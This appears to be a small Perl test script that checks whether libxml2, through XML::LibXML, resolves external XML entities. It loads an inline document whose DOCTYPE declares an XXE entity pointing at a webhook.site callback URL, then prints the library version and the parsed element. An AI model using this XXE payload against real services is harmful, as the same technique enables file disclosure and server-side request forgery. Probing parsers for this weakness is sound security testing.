#!/usr/bin/env perl

use 5.028;
use XML::LibXML ();

my $dom = XML::LibXML->load_xml( string => <<'EOF' );
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://webhook.site/0b5480b4-229c-4531-98f8-f39506257df3">]>
<foo>&xxe;</foo>
EOF

say 'Processed XML using libxml2 version ' . XML::LibXML::LIBXML_DOTTED_VERSION;
say for $dom->getElementsByTagName('foo');
